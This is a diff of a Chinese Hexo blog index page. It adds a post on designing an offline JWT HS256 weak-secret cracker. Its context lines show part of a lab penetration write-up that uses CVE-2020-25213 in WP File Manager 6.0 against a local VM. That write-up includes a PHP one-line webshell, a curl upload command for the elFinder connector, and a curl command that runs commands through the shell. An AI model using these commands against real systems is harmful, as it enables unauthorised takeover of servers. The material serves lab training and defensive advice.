@@ -128,16 +128,16 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">1</span>
+          <span class="site-state-item-count">2</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-count">2</span>
         <span class="site-state-item-name">分类</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
@@ -154,6 +154,108 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/05/22/HawkEye-Scanner%EF%BC%9A%E7%BA%AF%E7%A6%BB%E7%BA%BF%20JWT%20%E5%BC%B1%E5%AF%86%E9%92%A5%E9%AB%98%E5%B9%B6%E5%8F%91%E6%8E%A2%E6%B5%8B%E5%99%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="smile cat">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/05/22/HawkEye-Scanner%EF%BC%9A%E7%BA%AF%E7%A6%BB%E7%BA%BF%20JWT%20%E5%BC%B1%E5%AF%86%E9%92%A5%E9%AB%98%E5%B9%B6%E5%8F%91%E6%8E%A2%E6%B5%8B%E5%99%A8/" class="post-title-link" itemprop="url">构建高可用 JWT 审计工具：HawkEye-Scanner 底层架构与并发实践</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-05-22 10:00:00 / 修改时间：13:53:06" itemprop="dateCreated datePublished" datetime="2026-05-22T10:00:00+08:00">2026-05-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E5%8F%91-SecDev/" itemprop="url" rel="index"><span itemprop="name">安全研发 (SecDev)</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>在微服务大行其道的今天，JWT (RFC 7519) 已经成为 API 鉴权的基础设施。然而，在针对大规模资产进行鉴权基线审计时，如何构建一个既具备深度探测能力，又能在脏数据中稳定存活的扫描工具，始终是安全研发的一道工程考题。</p>
+<p>本文将复盘 HawkEye-Scanner 的核心设计逻辑，探讨如何摒弃臃肿的第三方框架，通过对密码学原理的拆解与底层字节流的严格管控，打造一款高并发、零崩溃的离线审计引擎。</p>
+<h2 id="0x01-破题与痛点：在线爆破的穷途末路与高级库的脆弱"><a href="#0x01-破题与痛点：在线爆破的穷途末路与高级库的脆弱" class="headerlink" title="0x01 破题与痛点：在线爆破的穷途末路与高级库的脆弱"></a>0x01 破题与痛点：在线爆破的穷途末路与高级库的脆弱</h2><p>在实战渗透中，针对鉴权接口的传统在线爆破（Online Brute-force）早已失效。现代架构下的 WAF、API 网关限流以及动态验证码，足以将任何在线枚举行为扼杀在摇篮里。因此，获取 Token 后的“离线破解”成为了唯一可行的路径。</p>
+<p>但在开发离线扫描器时，很多开发者习惯直接引入 <code>PyJWT</code> 等高级封装库来处理解析和校验。这种高度依赖上层 API 的做法在实验室环境中运行良好，一旦投入真实的复杂网络环境，就会暴露致命的工程缺陷：<strong>极差的容错率</strong>。</p>
+<p>真实业务线返回的数据包往往充满不可预期的脏数据。一旦抓取到结构残缺、Base64Url Padding 丢失或带有 <code>None</code> 算法标识的畸形 JWT，高级库会在反序列化阶段直接抛出未捕获的异常（如 <code>DecodeError</code>）。如果不做极其繁琐的异常捕获，整个高并发扫描队列会在遇到第一个畸形 Payload 时直接崩溃中断。</p>
+<p>为了保障高并发环境下的绝对稳定性，我们需要造一个更底层的轮子。</p>
+<h2 id="0x02-核心原理：HS256-离线字典碰撞的本质"><a href="#0x02-核心原理：HS256-离线字典碰撞的本质" class="headerlink" title="0x02 核心原理：HS256 离线字典碰撞的本质"></a>0x02 核心原理：HS256 离线字典碰撞的本质</h2><p>抛开各种封装好的类库，JWT 的结构极其简单：<code>Base64Url(Header) . Base64Url(Payload) . Signature</code>。</p>
+<p>在大多数未严格配置的业务线中，开发者常采用 HS256（HMAC-SHA256）作为签名算法。HS256 是一种对称加密方案，意味着签发 Token 和验证 Token 使用的是同一个 Secret Key。如果这个 Key 是诸如 <code>123456</code> 或 <code>admin123</code> 的弱口令，整个鉴权体系就会瞬间土崩瓦解。</p>
+<p>HawkEye-Scanner 的核心探测逻辑即建立在此之上。我们在获取到目标 JWT 后，完全切断与服务器的交互，在本地利用 <code>.txt</code> 弱口令字典进行离线重组：</p>
+<ol>
+<li>提取原始 Token 的 <code>Header</code> 和 <code>Payload</code> 部分。</li>
+<li>遍历本地字典，将字典中的密码作为 Secret Key。</li>
+<li>使用 HMAC-SHA256 算法，对 <code>Header.Payload</code> 重新计算签名。</li>
+<li>将计算出的签名进行 Base64Url 编码，并与原始 Token 的第三部分（<code>Signature</code>）进行精确的字符串比对。</li>
+</ol>
+<p>一旦比对成功，即意味着本地命中了目标服务器的 Secret Key。由于纯离线运算，这套机制规避了所有基于流量的网络防护规则。</p>
+<h2 id="0x03-底层重构：容错机制与字节流的精确管控"><a href="#0x03-底层重构：容错机制与字节流的精确管控" class="headerlink" title="0x03 底层重构：容错机制与字节流的精确管控"></a>0x03 底层重构：容错机制与字节流的精确管控</h2><p>离线碰撞的逻辑虽然清晰，但要保证它在面对成千上万个格式各异的 Token 时不崩溃，必须将数据清洗下沉到最底层的字节流（Bytes）级别。</p>
+<p><strong>处理 Base64Url 的协议变种与截断</strong><br>JWT 规范为了保证 URL 传输安全，采用了 Base64Url 变种（将 <code>+</code> 替换为 <code>-</code>，<code>/</code> 替换为 <code>_</code>），并强制去除了末尾的 <code>=</code> 填充符（Padding）。<br>然而，Python 标准库的解码器具有严格的长度校验机制。如果直接喂入截断后的数据，必定触发 <code>binascii.Error: Incorrect padding</code>。为了实现高可用解析，引擎在底层接管了清洗工作：通过 <code>len(data) % 4</code> 动态计算缺失长度，手动补齐 <code>=</code> 号，确保畸形数据在进入反序列化前已被标准化。</p>
+<p><strong>严控 String 与 Bytes 的边界转换</strong><br>在进行 HMAC 碰撞时，密码学底层接口（如 <code>hmac.new()</code>）是极其严苛的，它只接受二进制机器字节流（Bytes），而拒绝抽象的字符串（String）。<br>为了避免隐式类型推导带来的运行时崩溃，工具在调度中严格把控了变量的物理形态：<br>在进入加密引擎前，通过 <code>.encode(&#39;utf-8&#39;)</code> 将所有字符串显式转换为底层字节流；在摘要生成后，再次通过 <code>.decode(&#39;utf-8&#39;)</code> 将二进制数据反序列化为人类可读的字符串，以进行最终的哈希比对。这种隔离设计，从根本上消灭了类型不匹配导致的程序异常。</p>
+<h2 id="0x04-架构演进与实测闭环"><a href="#0x04-架构演进与实测闭环" class="headerlink" title="0x04 架构演进与实测闭环"></a>0x04 架构演进与实测闭环</h2><p>在完成了坚实的底层算力建设后，我们将目光转向了调度层的并发性能。</p>
+<p>面对海量资产，传统的单线程同步 I&#x2F;O 极其低效。HawkEye-Scanner 引入了 <code>ThreadPoolExecutor</code> 并发模型，将“网络请求（抓取 Token）”与“CPU 计算（离线碰撞）”在流水线中进行异步映射。通过配置 50 线程池，成功打破了网络 I&#x2F;O 阻塞。</p>
+<p>与此同时，我们在网络层引入了极端的防御性编程（Defensive Programming）。面对不同业务团队千奇百怪的 JSON 返回格式，采用链式 <code>.get()</code> 提取目标字段；并对整个发包与解析模块实施了异常静默（Swallow Exception）。这意味着，无论目标 IP 超时、端口拒绝还是返回了无法解析的乱码，异常线程都会被安全抛弃并释放资源，绝不将错误传递给主线程。</p>
+<p><strong>实测验证</strong><br>在研发末期，我基于 Flask 框架搭建了本地微服务靶机。在 50 线程的高压测试下，引擎稳定完成了“自动化并发发包 -&gt; 脏数据脱壳 -&gt; 内存级离线碰撞”的 DAST 闭环，实现了 0% 的崩溃率，并在毫秒级内成功从字典中碰撞出漏洞靶机的弱口令。</p>
+<p>安全工具的工程化本质，是寻找运行效率、架构鲁棒性与密码学底层原理之间的最佳平衡。本项目的核心模块已完成工程化解耦，完整源码已开源至 GitHub：[请在此处替换你的项目仓库链接]，欢迎同行交流探讨。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -191,9 +293,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2026-05-10 10:00:00 / 修改时间：15:33:23" itemprop="dateCreated datePublished" datetime="2026-05-10T10:00:00+08:00">2026-05-10</time>
+      <time title="创建时间：2026-05-10 10:00:00" itemprop="dateCreated datePublished" datetime="2026-05-10T10:00:00+08:00">2026-05-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-05-22 14:04:20" itemprop="dateModified" datetime="2026-05-22T14:04:20+08:00">2026-05-22</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -235,7 +343,7 @@
 <hr>
 <h2 id="0x02-侦察阶段：从扫描器漏报到目录-Fuzzing"><a href="#0x02-侦察阶段：从扫描器漏报到目录-Fuzzing" class="headerlink" title="0x02 侦察阶段：从扫描器漏报到目录 Fuzzing"></a>0x02 侦察阶段：从扫描器漏报到目录 Fuzzing</h2><p>在渗透的初始阶段，我对目标靶机进行了被动与主动的信息收集。</p>
 <h3 id="1-常规漏扫工具的盲区"><a href="#1-常规漏扫工具的盲区" class="headerlink" title="1. 常规漏扫工具的盲区"></a>1. 常规漏扫工具的盲区</h3><p>针对 WordPress 架构，业界通常首选 WPScan 进行被动枚举。但在本次针对性扫描中，工具并未检出任何高危插件：</p>
-<p><img src="/images/1.png" alt="WPScan 扫描结果漏报"></p>
+<p><img src="/images/blog1/1.png" alt="WPScan 扫描结果漏报"></p>
 <p><strong>技术分析</strong>：WPScan 的插件枚举逻辑主要依赖于发送 HTTP 请求探测 <code>/wp-content/plugins/[插件原生名称]/</code> 路径。一旦防御者重命名了该目录（即改变了 Plugin Slug），基于静态规则库的传统扫描器便会完全失效。</p>
 <h3 id="2-引入目录模糊测试-Fuzzing"><a href="#2-引入目录模糊测试-Fuzzing" class="headerlink" title="2. 引入目录模糊测试 (Fuzzing)"></a>2. 引入目录模糊测试 (Fuzzing)</h3><p>确认静态扫描失效后，我转而使用 <code>dirsearch</code> 对插件目录进行路径模糊测试，试图通过暴力枚举找出被隐藏的业务文件夹。</p>
 <p>为了提高探测精度并规避基础的 WAF 拦截，我配置了以下探测参数：</p>
@@ -247,9 +355,9 @@
 <p>执行命令：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.31.213/wordpress/wp-content/plugins/ -e php,txt,zip,bak -f --random-agent</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/2.png" alt="Dirsearch 默认字典配置"></p>
+<p><img src="/images/blog1/2.png" alt="Dirsearch 默认字典配置"></p>
 <p>然而，第一轮基于默认字典（包含 23635 个常用目录名）的扫描并未达到预期效果。终端输出了大量 <code>403 Forbidden</code> 以及 <code>301 Moved Permanently</code> 状态码：</p>
-<p><img src="/images/3.png" alt="Dirsearch 扫描日志降噪分析"></p>
+<p><img src="/images/blog1/3.png" alt="Dirsearch 扫描日志降噪分析"></p>
 <p><strong>深度研判：如何排除假阳性（False Positives）干扰？</strong><br>面对满屏红色的 403 和 301 状态码，如果不加甄别极易陷入“假阳性”陷阱。为确认第一轮扫描是否真正无果，我通过以下两个底层维度对海量日志进行了严格的降噪排查：</p>
 <ol>
 <li><p><strong>基于触发特征的 403 拦截甄别</strong>：<br>日志中大量出现的 403 报错（如针对 <code>%C0%AE%C0%AE%C0%AF</code> 等 URL 编码变体的探测），并非意味着存在此类奇葩目录。这是因为扫描器的 Payload 携带了明显的“目录穿越（Directory Traversal）”恶意特征，在抵达业务层前，直接触发了目标服务器底层的安全规则（WAF&#x2F;Apache 防护）而被强制阻断。这些响应纯属“规则拦截噪音”。</p>
@@ -262,9 +370,9 @@
 <p>通过挂载定制字典重新发起请求：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.31.213/wordpress/wp-content/plugins/ -e php,txt,zip,bak -f --random-agent -w raft-large-directories.txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/4.png" alt="挂载定制字典进行探测"></p>
+<p><img src="/images/blog1/4.png" alt="挂载定制字典进行探测"></p>
 <p>在高质量字典的碰撞下，服务器防线出现破局点。扫描日志中成功捕获到了针对非标准目录 <code>/bomb/</code> 的异常状态码：</p>
-<p><img src="/images/5.png" alt="成功锁定隐蔽目录 bomb"></p>
+<p><img src="/images/blog1/5.png" alt="成功锁定隐蔽目录 bomb"></p>
 <p>至此，通过 Fuzzing 策略的调整，我成功从黑盒状态下锁定了被管理员隐蔽重命名的高危组件目录位置，外围防线已被撕裂。</p>
 <hr>
 <h2 id="0x03-漏洞利用：指纹识别与系统接管"><a href="#0x03-漏洞利用：指纹识别与系统接管" class="headerlink" title="0x03 漏洞利用：指纹识别与系统接管"></a>0x03 漏洞利用：指纹识别与系统接管</h2><p>锁定了 <code>/bomb/</code> 目录后，接下来的核心任务是确认该隐蔽组件的真实身份，并寻找可利用的攻击面。</p>
@@ -272,18 +380,18 @@
 <p>我利用 <code>curl</code> 构造了轻量级的 HTTP GET 探针，尝试读取该目录下的说明文件，以期获取组件的版本指纹：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s http://192.168.31.213/wordpress/wp-content/plugins/bomb/readme.txt | <span class="built_in">head</span> -n 10</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/6.png" alt="组件指纹识别：通过 readme.txt 提取元数据"></p>
+<p><img src="/images/blog1/6.png" alt="组件指纹识别：通过 readme.txt 提取元数据"></p>
 <p><strong>情报确认</strong>：探针成功返回了数据。通过提取头部元数据（Metadata），我确认了这个被管理员重命名为 <code>bomb</code> 的隐蔽目录，其真实身份是 <strong>WP File Manager</strong> 插件，且当前运行版本为 <strong>6.0</strong>。<br>结合开源威胁情报（OSINT）及 CVE 漏洞库检索，确认该版本存在极其严重且易被利用的远程代码执行漏洞（CVE-2020-25213）。</p>
 <h3 id="2-漏洞定级与载荷锻造-Payload-Crafting"><a href="#2-漏洞定级与载荷锻造-Payload-Crafting" class="headerlink" title="2. 漏洞定级与载荷锻造 (Payload Crafting)"></a>2. 漏洞定级与载荷锻造 (Payload Crafting)</h3><p>CVE-2020-25213 的成因在于，WP File Manager 底层依赖了开源的 <code>elFinder</code> 文件管理器组件。开发者在发布正式版时，严重疏忽地将一个用于本地测试的无鉴权接口文件（<code>connector.minimal.php.dist</code>）去除了 <code>.dist</code> 后缀。这导致任何人都可以通过该接口直接调用底层的 C 端文件操作 API。</p>
 <p>在明确了攻击链路后，我选择在本地手工锻造一个极简的 PHP 一句话木马（WebShell），而非依赖 MSF 等重量级框架，以保障载荷的纯净度与隐蔽性：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> &gt; payload.php</span><br><span class="line"><span class="built_in">cat</span> payload.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/7.png" alt="本地构造极简 PHP 一句话木马"></p>
+<p><img src="/images/blog1/7.png" alt="本地构造极简 PHP 一句话木马"></p>
 <p>此 Payload 将利用 PHP 底层的 <code>system()</code> 函数，直接向目标宿主机的操作系统下发指令，并通过 HTTP GET 方法的 <code>cmd</code> 参数进行动态接收。</p>
 <h3 id="3-基于-elFinder-API-的后门投递"><a href="#3-基于-elFinder-API-的后门投递" class="headerlink" title="3. 基于 elFinder API 的后门投递"></a>3. 基于 elFinder API 的后门投递</h3><p>漏洞利用阶段，我规避了常规的图形化上传，直接使用 <code>curl</code> 模拟浏览器底层行为，向存在缺陷的 <code>connector.minimal.php</code> 接口发送 Multipart 表单数据包。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -F <span class="string">&quot;cmd=upload&quot;</span> -F <span class="string">&quot;target=l1_Lw&quot;</span> -F <span class="string">&quot;upload[]=@payload.php&quot;</span> http://192.168.31.213/wordpress/wp-content/plugins/bomb/lib/php/connector.minimal.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/8.png" alt="构造 Multipart 数据包完成木马投递"></p>
+<p><img src="/images/blog1/8.png" alt="构造 Multipart 数据包完成木马投递"></p>
 <p><strong>数据包构造的底层硬核解析</strong>：</p>
 <ul>
 <li><strong><code>cmd=upload</code> &amp; <code>target=l1_Lw</code></strong>：这是 <code>elFinder</code> 底层 API 的特定语法。<code>l1_Lw</code> 是插件工作根目录经过 Base64 变种编码后的标识符。该指令强制底层引擎将文件写入指定的高权限目录。</li>
@@ -292,7 +400,7 @@
 <p>如截图所示，服务器返回了详细的 JSON 响应。其中的 <code>&quot;name&quot;:&quot;payload.php&quot;</code> 及暴露的物理路径证明，WebShell 已成功突破防线，硬着陆于目标磁盘。</p>
 <hr>
 <h2 id="0x04-防御对抗：终端安全策略带来的挑战"><a href="#0x04-防御对抗：终端安全策略带来的挑战" class="headerlink" title="0x04 防御对抗：终端安全策略带来的挑战"></a>0x04 防御对抗：终端安全策略带来的挑战</h2><p>在尝试通过 <code>curl</code> 投递 Payload 的第一回合，攻击链路意外中断。尽管 Web 层的响应显示上传逻辑已触发，但目标宿主机的端点防护系统（Windows Defender）瞬间发出了红色预警：</p>
-<p><img src="/images/11.png" alt="Windows Defender 实时拦截截图"></p>
+<p><img src="/images/blog1/11.png" alt="Windows Defender 实时拦截截图"></p>
 <p><strong>深度防御行为分析：</strong><br>通过对拦截日志（图 11）的复盘，可以提取出两个关键的攻防情报：</p>
 <ol>
 <li><strong>静态特征码识别</strong>：Defender 将本次投递的载荷精准识别为 <code>Backdoor:PHP/Perhetshell.A!dha</code>。这证明即使是极简的 <code>system()</code> 函数调用，在现代 AV 引擎的静态特征库中也属于“高度敏感”级别的黑名单。</li>
@@ -303,12 +411,12 @@
 <h2 id="0x05-RCE-触发与后渗透信息收集"><a href="#0x05-RCE-触发与后渗透信息收集" class="headerlink" title="0x05 RCE 触发与后渗透信息收集"></a>0x05 RCE 触发与后渗透信息收集</h2><p>木马落地后，Web 应用的边界已被彻底击穿。为了验证操作系统级别的控制权，并为可能的内网横向移动（Lateral Movement）收集情报，我向预置的木马接口发送了 <code>ipconfig</code> 指令：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://192.168.31.213/wordpress/wp-content/plugins/bomb/lib/files/payload.php?cmd=ipconfig&quot;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/9.png" alt="触发 RCE 执行 ipconfig (暴露系统跨平台字符集碰撞)"></p>
+<p><img src="/images/blog1/9.png" alt="触发 RCE 执行 ipconfig (暴露系统跨平台字符集碰撞)"></p>
 <p>执行后，终端成功捕获了目标 Windows 宿主机的网络拓扑信息。但此时出现了一个典型的<strong>跨平台字符编码碰撞</strong>现象：目标机为中文 Windows，底层 CMD 输出采用 <strong>GBK (CP936)</strong> 编码，而攻击机 Kali 终端默认采用 <strong>UTF-8</strong> 解析，导致中文字段呈现乱码。</p>
 <p>为了保障渗透战报的规范性与可读性，我利用 Linux 原生的管道符结合 <code>iconv</code> 工具，在数据流回显的瞬间进行了底层的强制转码解码：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://192.168.31.213/wordpress/wp-content/plugins/bomb/lib/files/payload.php?cmd=ipconfig&quot;</span> | iconv -f GBK -t UTF-8</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/10.png" alt="通过 iconv 进行底层编码转换重构标准输出"></p>
+<p><img src="/images/blog1/10.png" alt="通过 iconv 进行底层编码转换重构标准输出"></p>
 <p><strong>战果研判（极其重要的后渗透发现）</strong>：<br>通过完美的标准输出，我不但取得了最高级别的命令执行权限，更在网络拓扑中发现了重大情报。目标宿主机除了暴露在 <code>192.168.31.0/24</code> 网段外，其底层还秘密运行着 <code>singbox_tun (172.18.0.2)</code> 代理隧道以及 <code>Radmin VPN (26.226.78.169)</code> 虚拟局域网。<br>在真实的红蓝对抗中，这几个隐藏的虚拟网卡将成为攻击者跳出当前隔离区，向内网深处进行隐蔽穿透的绝佳跳板。</p>
 <hr>
 <h2 id="0x05-总结与防御建议"><a href="#0x05-总结与防御建议" class="headerlink" title="0x05 总结与防御建议"></a>0x05 总结与防御建议</h2><p>本次黑盒渗透完整验证了“隐蔽式安全”的脆弱性。防御者试图通过重命名插件目录来规避自动化扫描，但这在具有针对性字典的 Fuzzing 攻击下形同虚设。最终，凭借对组件指纹的精准识别以及对 Web 容器底层数据处理逻辑（数组强制传参）的理解，成功突破了目标防线。</p>
